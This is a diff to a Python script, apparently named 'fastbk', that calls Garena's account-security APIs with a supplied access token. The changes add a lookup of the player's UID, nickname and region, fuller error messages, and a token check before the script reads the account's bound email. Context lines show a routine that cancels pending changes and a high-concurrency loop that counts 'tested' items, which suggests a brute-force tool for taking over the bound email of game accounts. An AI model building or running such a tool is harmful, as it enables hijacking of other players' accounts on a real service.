@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 """
 /fastbk standalone – No protobuf, no AES.
-Only uses aiohttp, hashlib, and asyncio.
-Run: python fastbk.py [concurrency]
+Only uses aiohttp, hashlib, asyncio.
+Run: python bot.py [concurrency]
 """
 
 import asyncio
@@ -18,6 +18,21 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# ---------- Helper to validate token & get player info ----------
+async def get_player_info(token: str) -> Dict[str, str]:
+    url = f"https://api-otrss.garena.com/support/callback/?access_token={token}"
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url, headers=headers, allow_redirects=True, timeout=15) as resp:
+            final_url = str(resp.url)
+            parsed = urllib.parse.urlparse(final_url)
+            params = urllib.parse.parse_qs(parsed.query)
+            return {
+                "uid": params.get("account_id", ["Unknown"])[0],
+                "nickname": urllib.parse.unquote(params.get("nickname", ["Unknown"])[0]),
+                "region": params.get("region", ["Unknown"])[0]
+            }
+
 # ---------- API Helpers ----------
 async def get_bind_info(token: str) -> Dict[str, Any]:
     url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
@@ -26,7 +41,12 @@ async def get_bind_info(token: str) -> Dict[str, Any]:
     async with aiohttp.ClientSession() as session:
         async with session.get(url, params=params, headers=headers, timeout=15) as resp:
             if resp.status != 200:
-                raise Exception(f"HTTP {resp.status}")
+                # Try to read error response
+                try:
+                    error_text = await resp.text()
+                    raise Exception(f"HTTP {resp.status} – {error_text[:200]}")
+                except:
+                    raise Exception(f"HTTP {resp.status}")
             return await resp.json()
 
 async def cancel_pending(token: str) -> bool:
@@ -157,12 +177,21 @@ def print_progress(tested: int, total: int, stage: str):
 
 # ---------- Main orchestrator ----------
 async def run_fastbk(token: str, concurrency: int = 150):
+    print("🔍 Validating token...")
+    try:
+        player = await get_player_info(token)
+        print(f"👤 Player: {player['nickname']} (UID: {player['uid']}, Region: {player['region']})")
+    except Exception as e:
+        print(f"❌ Token validation failed: {e}")
+        print("   The token is likely invalid or expired.")
+        return
+
     print("🔍 Fetching bind info...")
     try:
         bind = await get_bind_info(token)
         email = bind.get("email")
         if not email:
-            print("❌ No bound email found.")
+            print("❌ No bound email found on this account.")
             return
         print(f"📧 Bound email: {email}")
         if bind.get("email_to_be"):
